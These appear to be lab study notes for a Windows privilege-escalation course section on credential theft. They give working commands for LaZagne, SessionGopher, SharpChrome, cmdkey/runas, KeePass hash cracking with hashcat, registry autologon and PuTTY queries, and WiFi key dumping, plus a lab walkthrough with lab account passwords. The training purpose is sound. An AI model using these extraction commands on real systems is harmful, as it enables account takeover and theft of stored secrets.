# Section 23 — Further Credential Theft

> **Lab: yes** — Four questions: SA password (as jordan), RDP user for WEB01, vCenter root password, FTP password (as htb-student).

**Core principle:** Credentials are stored in saved Windows credentials (cmdkey), browser password stores, password managers (KeePass), PuTTY/WinSCP sessions, registry (autologon, proxy settings), and WiFi profiles. Tools like LaZagne and SessionGopher automate extraction across many sources at once.

---

## Credential sources and tools

| Source | Tool / Command | What it finds |
|--------|---------------|---------------|
| Windows Credential Manager | `cmdkey /list` | Saved RDP, network creds |
| Chrome saved passwords | `SharpChrome.exe logins /unprotect` | Website logins |
| KeePass databases | `keepass2john` + hashcat -m 13400 | Password vault contents |
| PuTTY/WinSCP/SuperPuTTY | `SessionGopher` | SSH sessions, saved passwords |
| Registry autologon | `reg query` Winlogon key | Auto-login username/password |
| PuTTY proxy creds | `reg query` PuTTY sessions | Proxy username/password in cleartext |
| WiFi passwords | `netsh wlan show profile key=clear` | Pre-shared keys |
| All of the above + more | `LaZagne.exe all` | Comprehensive credential sweep |

---

## cmdkey — Saved Windows credentials

```cmd
cmdkey /list
```
> Lists all saved credentials in Windows Credential Manager. Look for TERMSRV entries (RDP), domain creds, generic credentials.

### Use saved credentials with runas

```powershell
runas /savecred /user:DOMAIN\username "cmd.exe"
```
> If `/savecred` credentials exist for the user, this runs the command without prompting for a password.

---

## Browser credentials

### Chrome (SharpChrome)

```powershell
.\SharpChrome.exe logins /unprotect
```
> Decrypts saved Chrome passwords using DPAPI. Shows URL, username, and plaintext password. Must run as the user who saved the credentials.

---

## Password managers (KeePass)

### Find KeePass databases

```powershell
Get-ChildItem C:\ -Recurse -Include *.kdbx -ErrorAction Ignore
```

### Extract hash and crack

```bash
# Attacker box
python2.7 keepass2john.py database.kdbx > keepass_hash
hashcat -m 13400 keepass_hash /usr/share/wordlists/rockyou.txt
```
> Hash mode 13400 = KeePass. Once cracked, open the .kdbx with the master password to access all stored credentials.

---

## SessionGopher — PuTTY, WinSCP, RDP, SuperPuTTY

```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target <HOSTNAME>
```
> Searches HKEY_USERS for all users' saved sessions. Extracts and decrypts WinSCP, PuTTY, SuperPuTTY, and RDP credentials. Needs local admin to read all users' hives.

---

## LaZagne — comprehensive credential extraction

```powershell
.\lazagne.exe all
```
> Runs all modules: browsers, chats, databases, email, git, games, memory, multimedia, PHP, sysadmin, SVN, WiFi, Windows (credman, DPAPI, autologon, LSA secrets). Best single command for credential hunting.

Individual modules:
```powershell
.\lazagne.exe browsers
.\lazagne.exe windows
.\lazagne.exe sysadmin
.\lazagne.exe databases
```

---

## Registry credential locations

### Windows autologon

```cmd
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```
> Look for `DefaultUserName`, `DefaultPassword`, `AutoAdminLogon`. Plaintext credentials if autologon is configured.

### PuTTY saved sessions (proxy credentials)

```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
```
> Lists saved PuTTY sessions.

```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION_NAME>
```
> Look for `ProxyUsername` and `ProxyPassword` — stored in cleartext.

---

## WiFi passwords

```cmd
netsh wlan show profile
```
> Lists saved wireless networks.

```cmd
netsh wlan show profile <SSID> key=clear
```
> Shows the pre-shared key (`Key Content`) in plaintext. Requires local admin.

---

## Lab walkthrough

**Target:** `<TARGET_IP>` (ACADEMY-WINLPE-SRV01)

### Attack chain (editable)

```
┌─────────────────────────────────────────────────────────┐
│ VARIABLES — edit these for your instance                │
├─────────────────────────────────────────────────────────┤
│ TARGET_IP    = <TARGET_IP>                              │
│ USER_1       = jordan / HTB_@cademy_j0rdan!             │
│ USER_2       = htb-student / HTB_@cademy_stdnt!         │
└─────────────────────────────────────────────────────────┘

Q1: SA password for SQL01 (as jordan)
─────────────────────────────────────
1. RDP as jordan
   xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /compression /v:<TARGET_IP> /u:jordan /p:'HTB_@cademy_j0rdan!'

2. Run LaZagne
   C:\Tools\lazagne.exe all

3. Or run SessionGopher
   Import-Module C:\Tools\SessionGopher.ps1
   Invoke-SessionGopher -Target WINLPE-SRV01

4. Check cmdkey
   cmdkey /list

Q2: Which user has RDP creds for WEB01 (as htb-student)
────────────────────────────────────────────────────────
5. RDP as htb-student
   xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /compression /v:<TARGET_IP> /u:htb-student /p:'HTB_@cademy_stdnt!'

6. Check cmdkey
   cmdkey /list

Q3: Root password for vc01.inlanefreight.local (as htb-student)
───────────────────────────────────────────────────────────────
7. Run SharpChrome (check all users' Chrome)
   C:\Tools\SharpChrome.exe logins /unprotect

8. Or run LaZagne
   C:\Tools\lazagne.exe browsers

Q4: Password for ftp.ilfreight.local (as htb-student)
──────────────────────────────────────────────────────
9. Run SessionGopher
   Import-Module C:\Tools\SessionGopher.ps1
   Invoke-SessionGopher -Target WINLPE-SRV01

10. Or check PuTTY registry
    reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

11. Or run LaZagne
    C:\Tools\lazagne.exe all
```

---

## Key takeaways

- **LaZagne is the shotgun approach.** Run `lazagne.exe all` first to sweep everything, then investigate specific sources.
- **SessionGopher extracts saved session credentials** from PuTTY, WinSCP, SuperPuTTY, and RDP across all user hives (needs admin).
- **`cmdkey /list` reveals saved RDP and network credentials.** Combined with `runas /savecred`, this can give access as another user.
- **SharpChrome decrypts saved Chrome passwords** using DPAPI — must run as the user who saved them.
- **KeePass .kdbx files are crackable.** `keepass2john` + hashcat mode 13400. Often protected by weak master passwords.
- **Registry stores plaintext credentials** in autologon config and PuTTY proxy settings. Always check.
- **WiFi passwords are plaintext** with `netsh wlan show profile key=clear`. Can provide access to corporate wireless networks.
- **Run these checks twice** — once as your initial user, again after escalating to admin (more user hives become readable).
